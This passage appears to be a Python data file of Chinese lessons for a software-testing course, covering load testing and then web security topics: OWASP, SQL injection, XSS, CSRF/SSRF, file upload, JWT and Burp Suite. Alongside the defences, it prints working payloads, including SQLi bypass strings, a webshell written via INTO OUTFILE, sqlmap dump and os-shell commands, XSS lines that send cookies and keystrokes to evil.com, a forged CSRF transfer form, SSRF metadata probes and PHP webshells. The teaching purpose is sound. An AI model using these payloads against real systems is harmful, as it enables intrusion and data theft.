├── 单接口基准测试
├── 单链路小流量验证（1%流量染色验证）
└── 回滚方案演练

Phase 3: 执行（指定时间窗口，如凌晨2:00-6:00）
├── 阶梯加压（10%→30%→50%→70%→100%→120%）
├── 每个阶梯保持15-30分钟
├── 实时监控与问题记录
└── 异常场景模拟（kill一个节点，观察恢复）

Phase 4: 复盘（压测后1-3天）
├── 压测报告编写
├── 瓶颈问题整理与优先级排序
├── 优化方案制定
└── 容量规划建议
```

### 执行脚本示例

```bash
#!/bin/bash
echo "========== 全链路压测开始 =========="

# 10%流量预热
jmeter -n -t full_link_scenario.jmx -Jthreads=100 -Jduration=600 -Jrampup=120 -l results/warmup.jtl

ERROR_RATE=$(awk -F',' '{if($4=="false") count++} END{print count/NR*100}' results/warmup.jtl)
if (( $(echo "$ERROR_RATE > 1.0" | bc -l) )); then
    echo "错误率超过1%，终止压测！"; exit 1
fi

# 逐步加压
for PCT in 30 50 70 100 120; do
    THREADS=$(echo "$PCT * 1000 / 100" | bc)
    jmeter -n -t full_link_scenario.jmx -Jthreads=${THREADS} -Jduration=900 -Jrampup=180 -l results/stress_${PCT}pct.jtl
done

echo "========== 全链路压测结束 =========="
```

## 四、准入/准出标准

**准入条件**：
- [x] 压测方案已通过评审
- [x] 影子库/影子表已就绪
- [x] 全链路监控已部署
- [x] 外部依赖Mock可用性验证通过
- [x] 压测数据准备完成（≥目标TPS×120%的数据量）
- [x] 告警通知渠道已配置
- [x] 熔断机制已准备
- [x] 压测时间窗口已通知所有相关方

**准出标准**：
- [ ] 目标TPS达成（允许误差±5%）
- [ ] P99 RT < SLA阈值
- [ ] 错误率 < 1%
- [ ] CPU使用率 < 85%
- [ ] 内存使用率 < 90%
- [ ] 无数据库连接池耗尽
- [ ] 无消息队列积压
- [ ] 稳定性测试30分钟无性能退化

## 五、典型全链路压测报告结构

```
一、压测概述：目标1000TPS，生产环境凌晨窗口
二、压测场景：
   场景1：用户浏览→搜索→下单（60%流量）
   场景2：订单查询→物流跟踪（25%流量）
   场景3：商品评价→售后申请（15%流量）
三、压测结果：
   ✓ 场景1：TPS 620，P99=1200ms，错误率0.02%
   ✓ 场景2：TPS 260，P99=800ms，错误率0%
   ⚠ 场景3：TPS 150，P99=3500ms，错误率0.5%
四、瓶颈分析：
   · 订单服务DB连接池在80%流量时耗尽
   · 商品详情Redis命中率从95%降到72%
   · Nginx worker_connections接近上限
五、优化建议：
   P0: 增加DB连接池50→100
   P0: 预热商品详情Redis缓存
   P1: Nginx worker_connections 1024→4096
六、容量规划：
   当前上限：约850TPS
   扩容：订单服务3节点→5节点，可提升至1200TPS
```

> **小结**：全链路压测的三大关键：数据隔离、流量染色、监控全覆盖。""",
    },
]

# ============================================================
# 路径14: 安全测试基础
# ============================================================
LESSON_CONTENT_4["安全测试基础"] = [
    {
        "title": "第1节：Web安全概述与OWASP Top 10(2021)",
        "sort_order": 1,
        "knowledge_point": "Web安全概述",
        "time_estimate": 30,
        "content": """## Web安全概述与OWASP Top 10(2021)

Web安全是保障Web应用免受恶意攻击和未授权访问的综合性学科。随着数字化转型深入，Web安全的重要性已上升到企业战略层面。

## 一、信息安全CIA三要素

| 要素 | 英文 | 含义 | 攻击示例 |
|------|------|------|----------|
| 机密性 | Confidentiality | 确保信息不被未授权者获取 | SQL注入窃取用户数据 |
| 完整性 | Integrity | 确保信息不被未授权篡改 | XSS篡改页面内容 |
| 可用性 | Availability | 确保授权用户可正常访问 | DDoS导致服务不可用 |

扩展要素还包括不可否认性（Non-repudiation）、真实性（Authenticity）和可审计性（Accountability）。

## 二、OWASP Top 10 (2021版) 详解

OWASP每3-4年更新一次Top 10安全风险榜单，是Web安全领域最权威的参考框架。

| 排名 | 风险类别 | 英文名称 | 影响 |
|------|----------|----------|------|
| A01 | 访问控制失效 | Broken Access Control | 越权访问 |
| A02 | 加密机制失效 | Cryptographic Failures | 数据泄露 |
| A03 | 注入攻击 | Injection | 数据窃取/篡改 |
| A04 | 不安全的设计 | Insecure Design | 架构性缺陷 |
| A05 | 安全配置错误 | Security Misconfiguration | 信息泄露 |
| A06 | 脆弱和过时的组件 | Vulnerable Components | 已知漏洞利用 |
| A07 | 身份认证失败 | Identification Failures | 账号劫持 |
| A08 | 数据完整性失效 | Software Integrity Failures | 供应链攻击 |
| A09 | 日志监控失效 | Logging Failures | 攻击无感知 |
| A10 | SSRF | Server-Side Request Forgery | 内网探测 |

### 2021版与2017版主要变化

| 变化 | 说明 |
|------|------|
| 注入从A01降至A03 | 开发者对注入防护意识提升 |
| 新增A04不安全的设计 | 强调架构设计阶段安全考量 |
| 新增A08数据完整性失效 | 关注CI/CD管道安全、反序列化 |
| XXE移除 | 实际占比下降 |

## 三、安全测试在SDLC中的定位

```
需求分析→架构设计→编码开发→测试验证→部署上线→运维监控
    │        │        │        │        │        │
    ▼        ▼        ▼        ▼        ▼        ▼
 安全需求  威胁建模  代码审计  SAST/DAST 安全配置  安全监控
 评审      安全设计  IDE插件  渗透测试  基线扫描  WAF/RASP
         (Shift-Left Security 安全左移)
```

### 安全测试分类

| 类型 | 简称 | 阶段 | 代表性工具 |
|------|------|------|-----------|
| 静态应用安全测试 | SAST | 编码阶段 | SonarQube, Fortify, Checkmarx |
| 动态应用安全测试 | DAST | 测试阶段 | OWASP ZAP, Burp Suite, Acunetix |
| 交互式应用安全测试 | IAST | 测试阶段 | Contrast Security, Seeker |
| 软件组成分析 | SCA | 全流程 | Snyk, Black Duck |
| 运行时应用自我保护 | RASP | 生产环境 | 运行时注入防护 |

## 四、渗透测试执行标准(PTES)

```
1.前期交互→2.情报收集→3.威胁建模→4.漏洞分析→5.漏洞利用→6.后渗透→7.报告编写
```

### 常见攻击面梳理

- [ ] 输入验证：表单、文件上传、URL参数、API请求体
- [ ] 认证与授权：登录、注册、密码重置、Token管理、角色权限
- [ ] 会话管理：Cookie属性(HttpOnly/Secure/SameSite)、Session超时
- [ ] 数据传输：HTTPS、证书有效性、敏感数据加密
- [ ] 错误处理：异常页面信息泄露、调试信息暴露
- [ ] 日志安全：敏感信息是否记录到日志中
- [ ] 第三方依赖：npm/pip/maven依赖版本漏洞
- [ ] 配置安全：默认密码、Debug模式、目录列表

> **小结**：安全测试工程师的价值在于，能像攻击者一样思考，像防御者一样行动。""",
    },
    {
        "title": "第2节：SQL注入原理、检测与防御",
        "sort_order": 2,
        "knowledge_point": "SQL注入",
        "time_estimate": 35,
        "content": """## SQL注入原理、检测与防御

SQL注入（SQL Injection，简称SQLi）是最古老但至今仍高居漏洞榜单的Web安全漏洞。攻击者可能通过一条SQL注入Payload获取整个数据库的控制权。

## 一、SQL注入原理

SQL注入的本质是：**用户输入被当作SQL代码执行**。当开发者使用字符串拼接构造SQL且未对用户输入过滤时，攻击者就能注入恶意SQL代码。

```java
// 危险代码示例
String sql = "SELECT * FROM users WHERE username='" + username
           + "' AND password='" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

当输入username=`admin' --`时，SQL变为：`SELECT * FROM users WHERE username='admin' --' AND password='xxx'`。`--`后的内容被注释，攻击者无需密码即可登录。

### 注入点类型

| 类型 | 注入位置 | 示例 |
|------|----------|------|
| GET参数注入 | URL查询字符串 | `?id=1 UNION SELECT...` |
| POST参数注入 | 请求体 | `username=admin' OR '1'='1` |
| HTTP头注入 | User-Agent/Cookie/Referer | Cookie注入 |
| 二阶注入 | 存储后二次触发 | 注册时注入，登录触发 |

## 二、SQL注入分类

```
SQL注入分类
├── 联合查询注入（UNION-based）
├── 报错注入（Error-based）
├── 布尔盲注（Boolean-based Blind）
├── 时间盲注（Time-based Blind）
├── 堆叠查询注入（Stacked Queries）
└── 带外注入（Out-of-Band）
```

### 经典Payload

```sql
-- 万能密码绕过
' OR '1'='1
admin'--
') OR ('1'='1

-- UNION联合查询
' UNION SELECT username, password FROM users--
' UNION SELECT 1, database(), user(), version()--

-- 时间盲注（MySQL）
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --

-- 堆叠查询
'; DROP TABLE users; --

-- 读写文件（MySQL高权限）
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php'--
```

## 三、检测方法

### 手工检测

```python
import requests

def detect_sql_injection(url, param):
    payloads = ["'", "\"", "')", "' OR '1'='1", "' AND SLEEP(5) --"]
    baseline_time = measure_response_time(url, param, "normal")
    for payload in payloads:
        resp = requests.get(url.replace(f"{param}=", f"{param}={payload}"), timeout=30)
        if resp.elapsed.total_seconds() > baseline_time + 3:
            print(f"[!] 时间盲注可能: {payload}")
        if any(err in resp.text.lower() for err in ['sql','mysql','syntax']):
            print(f"[!] 报错注入可能: {payload}")
```

### 自动化工具

| 工具 | 特点 | 命令 |
|------|------|------|
| sqlmap | 最强大的SQL注入工具 | `sqlmap -u "url" --dbs` |
| OWASP ZAP | 免费综合扫描器 | 自动化扫描 |
| Burp Suite | 商业级安全套件 | Active Scan + Intruder |

```bash
# sqlmap常用命令
sqlmap -u "http://target.com/page?id=1"         # 基本检测
sqlmap -u "http://target.com/page?id=1" --dbs   # 列出数据库
sqlmap -u "url" -D db -T users --dump           # dump数据
sqlmap -u "url" --level=3 --risk=2              # 提高检测强度
sqlmap -u "url" --os-shell                      # OS Shell（高权限）
```

## 四、防御方案

### 参数化查询（首选方案）

```java
// 安全方式
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);
```

```python
# Python参数化
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
# ORM自动参数化
user = User.objects.filter(username=username, password=password).first()
```

### 多层防御矩阵

```
    输入验证（白名单）
         ↓
    参数化查询（核心防线）
         ↓
    最小权限（DB账号限制）
         ↓
    WAF/防火墙
```

### 防御措施优先级

| 措施 | 说明 | 优先级 |
|------|------|--------|
| 参数化查询 | 永远不拼接SQL字符串 | 🔴 P0 必须 |
| ORM框架 | Django/SQLAlchemy/MyBatis #{} | 🔴 P0 必须 |
| 输入白名单 | 仅允许预期格式输入 | 🟠 P1 强烈建议 |
| 最小权限 | 禁止DROP/ALTER等高危权限 | 🟠 P1 强烈建议 |
| 错误信息隐藏 | 生产环境关闭详细错误回显 | 🟠 P1 强烈建议 |
| WAF | ModSecurity等 | 🟡 P2 建议 |

### 防御检查清单

- [ ] 所有SQL使用参数化查询（PreparedStatement/ORM）
- [ ] 不存在字符串拼接构造SQL的情况
- [ ] 动态表名/列名使用白名单映射
- [ ] DB连接账号只有SELECT/INSERT/UPDATE/DELETE权限
- [ ] 生产环境不显示数据库详细错误信息

> **小结**：防御SQL注入非常简单——永远使用参数化查询，永远不要拼接SQL字符串。做到这一点，90%以上的SQL注入风险即可杜绝。""",
    },
    {
        "title": "第3节：XSS跨站脚本攻击详解",
        "sort_order": 3,
        "knowledge_point": "XSS攻击",
        "time_estimate": 35,
        "content": """## XSS跨站脚本攻击详解

XSS（Cross-Site Scripting）是OWASP Top 10中长期位列前茅的漏洞。与SQL注入攻击服务端不同，XSS的攻击目标通常是浏览器端的其他用户。

## 一、XSS攻击原理

XSS本质：攻击者将恶意脚本注入Web页面，其他用户访问时脚本在浏览器中执行，窃取Cookie、劫持会话、篡改页面。

### 攻击流程

```
攻击者 → 提交恶意脚本(评论/留言) → 网站服务器 → 存储到数据库
                                                    ↓
受害者 ← 返回含恶意脚本的HTML ← 网站服务器 ← 用户访问页面
   ↓
浏览器执行恶意脚本 → 窃取Cookie/会话劫持
   ↓
攻击者接收被盗数据
```

## 二、XSS三种类型

| 类型 | 英文 | 触发方式 | 持久性 | 危害范围 |
|------|------|----------|--------|----------|
| 反射型XSS | Reflected | 点击恶意链接 | 非持久 | 单个用户 |
| 存储型XSS | Stored | 访问正常页面 | 持久(存DB) | 所有访问用户 |
| DOM型XSS | DOM-based | JS代码动态处理 | 非持久 | 单个用户 |

### 反射型XSS

```javascript
// 漏洞代码
app.get('/search', (req, res) => {
    const keyword = req.query.keyword;
    res.send(`<h1>搜索结果: ${keyword}</h1>`);  // 直接拼接！
});
// 攻击: /search?keyword=<script>fetch('http://evil.com?c='+document.cookie)</script>
```

### 存储型XSS

```python
# Django漏洞代码
def post_comment(request):
    content = request.POST.get('content')
    Comment.objects.create(content=content, user=request.user)
    return redirect('/comments/')
# 模板: {{ comment.content|safe }} ← 危险！safe过滤器不转义
```

### DOM型XSS

```javascript
// 前端漏洞代码
const username = new URLSearchParams(location.search).get('username');
document.getElementById('welcome').innerHTML = `欢迎, ${username}!`;
// 攻击: ?username=<img src=x onerror=alert(1)>

// 同样危险：document.write()/eval()/setTimeout(userInput)
```

## 三、XSS攻击Payload

```html
<!-- 基本弹窗 -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- 绕过过滤 -->
<ScRiPt>alert(1)</ScRiPt>                    <!-- 大小写绕过 -->
<script>alert(String.fromCharCode(88,83,83))</script>  <!-- 编码绕过 -->

<!-- 事件处理器 -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- Cookie窃取 -->
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<script>fetch('http://evil.com/log',{method:'POST',body:document.cookie})</script>

<!-- 钓鱼欺骗 -->
<script>
document.body.innerHTML = '<h1>Session已过期，请重新登录</h1>'
  + '<form action="http://evil.com/steal" method="POST">'
  + '<input name="username"><input name="password" type="password"></form>';
</script>

<!-- 键盘记录 -->
<script>document.onkeypress=function(e){fetch('http://evil.com/k?key='+e.key)}</script>
```

## 四、XSS防御

### 输出编码（核心防御）

```java
// OWASP Encoder
String safeHtml = Encode.forHtml(userInput);
String safeAttr = Encode.forHtmlAttribute(userInput);
String safeJs = Encode.forJavaScript(userInput);
```

### CSP内容安全策略

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}';
```

CSP指令：`default-src 'self'`(默认同源), `script-src 'self'`(脚本同源), `frame-ancestors 'none'`(禁止被iframe嵌入)。

### Cookie安全属性

```java
Cookie cookie = new Cookie("SESSIONID", sessionId);
cookie.setHttpOnly(true);    // 禁止JS读取
cookie.setSecure(true);      // 仅HTTPS传输
cookie.setSameSite("Strict"); // 防CSRF
```

### 前端框架自动转义

```html
<!-- React/Vue自动转义（安全） -->
<div>{userInput}</div>
<div>{{ userInput }}</div>

<!-- 危险用法 -->
<div v-html="userInput"></div>  <!-- 仅可信内容使用 -->
<div [innerHTML]="userInput"></div>  <!-- Angular需DomSanitizer -->
```

```javascript
// 富文本使用DOMPurify净化
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b','i','em','strong','a','p','br'],
    ALLOWED_ATTR: ['href','title']
});
```

### XSS防御检查清单

- [ ] 所有用户输入在输出时HTML实体编码
- [ ] 避免innerHTML/document.write/eval等危险API
- [ ] 使用现代前端框架默认转义
- [ ] 设置HttpOnly/Secure/SameSite Cookie
- [ ] 部署Content-Security-Policy
- [ ] 设置X-Content-Type-Options: nosniff
- [ ] 使用DOMPurify净化富文本

> **小结**：XSS防御口诀——输入验证、输出编码、CSP兜底、Cookie加固。""",
    },
    {
        "title": "第4节：CSRF与SSRF攻击与防护",
        "sort_order": 4,
        "knowledge_point": "CSRF/SSRF",
        "time_estimate": 35,
        "content": """## CSRF与SSRF攻击与防护

CSRF（跨站请求伪造）和SSRF（服务端请求伪造）都是"伪造请求"类攻击，但攻击发起端和防御策略截然不同。CSRF挟持用户浏览器，SSRF利用服务端发起。

## 一、CSRF攻击原理

```
受害者登录bank.com获得Cookie → 访问恶意网站evil.com
    → evil.com返回恶意页面 → 浏览器自动携带bank.com Cookie
    → 向bank.com发起伪造的转账请求
```

### 攻击Payload

```html
<!-- evil.com上的恶意页面 -->
<!-- GET方式 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- POST方式 -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit()</script>
```

### CSRF漏洞检测

```python
def check_csrf(target_url):
    # 1. 检查CSRF Token
    resp = requests.get(target_url + "/transfer_form")
    if "csrf_token" not in resp.text:
        print("[!] 未发现CSRF Token")

    # 2. 不验证Referer测试
    resp = requests.post(target_url + "/transfer",
                         data={"to":"test","amount":1},
                         headers={"Referer":""})
    if resp.status_code == 200 and "success" in resp.text:
        print("[!] 未验证Referer")

    # 3. Cookie SameSite属性检查
    # Set-Cookie: sessionid=xxx; SameSite=Lax ← 合格
```

## 二、CSRF防御方案

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| CSRF Token | 每次请求携带随机Token | 最可靠 | 需前后端配合 |
| SameSite Cookie | 浏览器限制跨站Cookie | 零开发成本 | 兼容性(已解决) |
| Referer验证 | 检查请求来源域名 | 简单 | 可被伪造 |
| 双重Cookie | 请求头+Cookie双重验证 | 不依赖Session | 子域名有风险 |
| 验证码 | 关键操作需人机验证 | 体验好 | 增加操作步骤 |

```python
# Flask CSRF Token
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
def transfer():
    return jsonify({"status": "success"})
```

```html
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
</form>
```

SameSite取值：Strict(完全禁止跨站)、Lax(允许顶层导航GET，推荐)、None(允许跨站，需Secure)。

## 三、SSRF攻击原理

SSRF利用服务端发起伪造请求，访问或攻击内部网络资源。

```
攻击者 → Web服务器(公网) SSRF→ 内网
                              ├── 数据库 10.0.1.10
                              ├── Redis 10.0.1.20
                              ├── 管理后台 10.0.1.30
                              └── 云元数据 169.254.x.x
```

### 漏洞代码

```python
# 危险！
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    return requests.get(url).text  # 直接请求用户提供的URL

# 攻击Payload：
# /fetch?url=http://10.0.1.10:3306  → 探测内网MySQL
# /fetch?url=http://169.254.169.254/latest/meta-data/  → AWS元数据
# /fetch?url=file:///etc/passwd  → 读取本地文件
# /fetch?url=gopher://10.0.1.20:6379/_*1...  → 攻击Redis
```

### SSRF支持的危险协议

| 协议 | 用途 | 风险 |
|------|------|------|
| http:// | 访问内网Web | 读取内网页面 |
| file:// | 读取本地文件 | 泄露服务器文件 |
| dict:// | 探测端口 | 端口扫描 |
| gopher:// | 构造TCP请求 | 攻击Redis/Memcached |
| ftp:// | FTP请求 | 内网文件访问 |

## 四、SSRF防御

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = {'api.trusted.com', 'cdn.example.com'}
ALLOWED_SCHEMES = {'http', 'https'}

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    # 1. 协议白名单
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    # 2. 域名白名单
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    # 3. 禁止内网IP
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except ValueError:
        return False
    return True
```

SSRF防御优先级：URL白名单(P0)、协议白名单(P0)、内网IP过滤(P0)、DNS解析后验证(P1)、响应限制(P1)、网络隔离(P2)。

## 五、防御检查清单

**CSRF**：所有状态变更请求含CSRF Token、SameSite=Lax/Strict、关键操作二次确认、验证Referer。

**SSRF**：URL白名单、禁止危险协议(file/gopher/dict)、DNS解析后验证IP、服务端独立网络环境、超时和响应限制、不将用户URL直接传递给curl/requests。

> **小结**：CSRF防御重在"谁在发请求"（Token/SameSite），SSRF防御重在"请求发到了哪里"（白名单/内网过滤）。""",
    },
    {
        "title": "第5节：文件上传漏洞与防御",
        "sort_order": 5,
        "knowledge_point": "文件上传漏洞",
        "time_estimate": 30,
        "content": """## 文件上传漏洞与防御

文件上传功能几乎是每个Web应用的基础功能，但也是最具破坏力的安全漏洞之一。一个未防护的文件上传接口可能直接导致服务器被完全控制。

## 一、攻击路径与Payload

```
攻击者上传恶意文件 → 服务器保存
  ├── Web可访问目录 → 直接访问执行Webshell
  ├── 路径遍历 → 覆盖系统关键文件
  ├── 超大文件 → 磁盘耗尽(DoS)
  └── 恶意内容(木马) → 感染其他用户
```

### Webshell示例

```php
<?php @eval($_POST['cmd']); ?>                          <!-- 一句话 -->
<?php system($_GET['cmd']); ?>                           <!-- 文件管理 -->
<?php
error_reporting(0);
if(md5($_GET['pass'])=='098f6bcd4621d373cade4e832627b4f6'){
    echo "<pre>"; system($_POST['cmd']); echo "</pre>";  <!-- 完整Webshell -->
}
?>
```

## 二、文件上传绕过技术

| 绕过方式 | 示例 | 原理 |
|----------|------|------|
| 双扩展名 | shell.php.jpg | 解析漏洞 |
| 大小写 | shell.PhP | 黑名单不完整 |
| 空格绕过 | shell.php(末尾空格) | Windows自动去除 |
| 点号绕过 | shell.php. | Windows去除末尾点 |
| ::DATA | shell.php::$DATA | Windows NTFS流 |
| 特殊扩展名 | shell.php5/phtml | Apache未配置 |
| %00截断 | shell.php%00.jpg | 旧版PHP截断 |
| .htaccess | 上传.htaccess | Apache配置覆盖 |

### 图片马制作

```bash
# Windows
copy /b normal.jpg + shell.php webshell.jpg

# Linux
cat normal.jpg shell.php > webshell.jpg

# EXIF嵌入代码
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

## 三、完整防御方案

```python
import os, uuid, magic
from PIL import Image

class FileUploadValidator:
    ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf', 'docx'}
    ALLOWED_MIMETYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
    MAX_FILE_SIZE = 10 * 1024 * 1024

    @classmethod
    def validate(cls, file) -> tuple:
        file.file.seek(0, 2); size = file.file.tell(); file.file.seek(0)
        if size > cls.MAX_FILE_SIZE:
            return False, "文件大小超过限制"

        ext = file.filename.rsplit('.', 1)[-1].lower()
        if ext not in cls.ALLOWED_EXTENSIONS:
            return False, f"不允许的文件类型: {ext}"

        content = file.file.read(2048); file.file.seek(0)
        mime = magic.from_buffer(content, mime=True)
        if mime not in cls.ALLOWED_MIMETYPES:
            return False, f"文件类型不匹配: {mime}"

        if mime.startswith('image/'):
            try:
                img = Image.open(file.file); img.verify(); file.file.seek(0)
            except: return False, "图片损坏或不合法"

        return True, "验证通过"

    @staticmethod
    def safe_save(file, upload_dir: str) -> str:
        ext = file.filename.rsplit('.', 1)[-1].lower()
        safe_name = f"{uuid.uuid4().hex}.{ext}"
        file_path = os.path.join(upload_dir, safe_name)
        file.save(file_path)
        os.chmod(file_path, 0o644)  # 不可执行
        return safe_name
```

### Nginx配置加固

```nginx
# 禁止上传目录执行PHP
location /uploads/ {
    location ~ .*\\.(php|php5|phtml|pl|py|jsp|asp|sh|cgi)?$ { deny all; }
    autoindex off;
}
add_header X-Content-Type-Options "nosniff";
add_header Content-Disposition "attachment";
```

### 防御层次

```
客户端验证(非安全依赖)→扩展名白名单→MIME验证(魔数)→内容检查(杀毒/图片重渲染)
→存储安全(随机文件名/不可执行/独立域名)→访问控制(CDN/独立文件服务器)
```

### 防御检查清单

- [ ] 白名单验证扩展名（非黑名单）
- [ ] 检查真实MIME类型（magic bytes），非Content-Type
- [ ] 限制上传文件大小
- [ ] 文件存储Web根目录之外，通过接口读取
- [ ] UUID重命名文件
- [ ] 上传目录不可执行权限
- [ ] 图片二次渲染/压缩去除恶意代码
- [ ] Nginx/Apache禁止上传目录执行脚本
- [ ] 独立文件服务器/OSS/CDN域名
- [ ] Content-Disposition: attachment响应头
- [ ] 身份认证后才可上传
- [ ] 限额控制：上传频率和总量

> **小结**：核心原则——将上传目录与代码执行环境完全隔离，即使上传了恶意脚本也无法执行。""",
    },
    {
        "title": "第6节：认证与授权安全(JWT安全/Session安全)",
        "sort_order": 6,
        "knowledge_point": "认证授权安全",
        "time_estimate": 35,
        "content": """## 认证与授权安全

认证（你是谁）和授权（你能做什么）是Web安全的第一道防线。

## 一、认证 vs 授权

| 概念 | 英文 | 核心问题 | 实现方式 |
|------|------|----------|----------|
| 认证 | Authentication | 你是谁？ | 密码、短信、生物识别、OAuth |
| 授权 | Authorization | 你能做什么？ | RBAC、ACL、JWT权限声明 |

## 二、Session安全

### Session安全配置

```python
# Flask Session安全配置
app.config.update(
    SESSION_COOKIE_SECURE=True,       # 仅HTTPS
    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS读取
    SESSION_COOKIE_SAMESITE='Lax',    # CSRF防护
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2),
    SESSION_REFRESH_EACH_REQUEST=True,
)
```

### Session安全清单

- [ ] Cookie HttpOnly（禁止JS读取）
- [ ] Cookie Secure（仅HTTPS）
- [ ] Cookie SameSite=Lax/Strict（防CSRF）
- [ ] Session ID足够随机（≥128位熵）
- [ ] Session过期时间合理
- [ ] 登录后重新生成Session ID（防Session Fixation）
- [ ] 登出时销毁服务端Session

## 三、JWT安全

### JWT结构

```
Header:  {"alg": "HS256", "typ": "JWT"}          ← Base64编码
Payload: {"sub":"123","name":"John","role":"user"} ← Base64编码
Signature: HMACSHA256(header+"."+payload, secret)  ← 签名
```

### JWT常见安全漏洞

| 漏洞 | 说明 | 危害 | 修复 |
|------|------|------|------|
| 算法混淆攻击 | RS256公钥当HS256密钥 | 伪造Token | 严格校验alg |
| none算法 | alg=none绕过签名 | 伪造Token | 过滤none |
| 密钥泄露 | 硬编码/弱密钥 | Token被破解 | Vault管理 |
| 敏感信息泄露 | Payload含密码 | 信息泄露 | 不存敏感数据 |
| 无过期时间 | Token永久有效 | 无法撤销 | 设置exp |
| 未校验签名 | decode非verify | 可篡改Payload | 必须verify |

```python
# 正确验证方式
payload = jwt.decode(token, secret, algorithms=['HS256'])
# 危险！
# payload = jwt.decode(token, options={"verify_signature": False})  # 禁止！
```

### JWT最佳实践

```python
import jwt, uuid
from datetime import datetime, timedelta

class JWTManager:
    ACCESS_TOKEN_EXPIRE = 15  # 分钟（短时效）
    REFRESH_TOKEN_EXPIRE = 7  # 天

    @classmethod
    def create_access_token(cls, user_id: str, roles: list) -> str:
        payload = {
            "sub": user_id, "roles": roles,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(minutes=cls.ACCESS_TOKEN_EXPIRE),
            "jti": str(uuid.uuid4()),
            "iss": "myapp.com', 'aud': 'myapp-api",
        }
        return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

    @classmethod
    def verify_token(cls, token: str) -> dict:
        return jwt.decode(token, SECRET_KEY, algorithms=["HS256"],
            options={"require":["exp","iat","sub","jti"],
                     "verify_exp":True, "verify_iat":True},
            audience="myapp-api", issuer="myapp.com")

    @classmethod
    def revoke_token(cls, jti: str):
        redis_client.setex(f"jwt_blacklist:{jti}",
            timedelta(minutes=cls.ACCESS_TOKEN_EXPIRE), "revoked")
```

### Token存储对比

| 存储方式 | XSS风险 | CSRF风险 | 优点 | 缺点 |
|----------|---------|----------|------|------|
| localStorage | 高 | 低 | 方便 | JS可读 |
| sessionStorage | 高 | 低 | 关闭清除 | 跨标签页不共享 |
| Cookie(HttpOnly) | 低 | 中 | JS不可读 | 需防CSRF |
| 内存变量 | 低 | 低 | 最安全 | 刷新丢失 |

### 双Token机制

Access Token(15分钟)过期→POST /refresh→返回新Access Token。Refresh Token(7天)存储在HttpOnly Cookie中。

## 四、常见认证漏洞

| 漏洞 | 检测方法 | 修复方案 |
|------|----------|----------|
| 弱密码 | 尝试常见弱密码 | 复杂度要求+密码强度计 |
| 暴力破解 | 连续尝试密码 | 频率限制+验证码+锁定 |
| 用户名枚举 | 不同错误不同信息 | 统一提示"用户名或密码错误" |
| 密码明文传输 | 抓包分析 | HTTPS+bcrypt存储 |
| 密码重置劫持 | 篡改重置Token | Token绑定用户+过期+一次性 |
| 记住我漏洞 | Cookie中可预测Token | 随机Token+DB校验 |
| 会话固定 | 登录前后SessionID不变 | 登录后重新生成 |

> **小结**：短时效Access Token+长时效Refresh Token+Token撤销机制=安全的JWT方案。""",
    },
    {
        "title": "第7节：Burp Suite安全测试工具实战",
        "sort_order": 7,
        "knowledge_point": "Burp Suite工具",
        "time_estimate": 35,
        "content": """## Burp Suite安全测试工具实战

Burp Suite是PortSwigger公司开发的集成化Web安全测试平台，集成了代理拦截、漏洞扫描、模糊测试、重放攻击等核心功能。

## 一、版本对比

| 特性 | Community(免费) | Professional(付费) |
|------|-----------------|-------------------|
| 代理拦截 | ✅ | ✅ |
| Repeater | ✅ | ✅ |
| Intruder | ✅(限速) | ✅(无限制) |
| Decoder | ✅ | ✅ |
| Scanner | ❌ | ✅ |
| Collaborator | ❌ | ✅ |
| BApp插件 | ✅ | ✅ |

## 二、核心模块

### 模块架构

```
浏览器←→Proxy(代理拦截)←→目标服务器
          ↓
        Target(站点地图)
          ↓
        Repeater(请求重放)
          ↓
        Intruder(自动化攻击)
          ↓
        Scanner(漏洞扫描)

辅助：Decoder/Comparer/Sequencer
扩展：BApp Store
```

### Proxy（代理拦截）

```bash
1. 设置浏览器代理 127.0.0.1:8080
2. 安装Burp CA证书（抓HTTPS）
3. Intercept开关控制拦截
4. Forward(放行)/Drop(丢弃)/Send to Repeater
```

### Repeater（请求重放）

手动修改和重放请求，最常用模块：
- 修改URL/Header/Body任意部分
- 权限绕过：修改Cookie/Token
- IDOR测试：修改资源ID
- SQL注入手工验证
- 文件上传绕过：修改Content-Type/Filename

### Intruder（爆破）

攻击类型：Sniper(逐个参数)、Battering Ram(同一Payload)、Pitchfork(一一对应)、Cluster Bomb(全排列)。

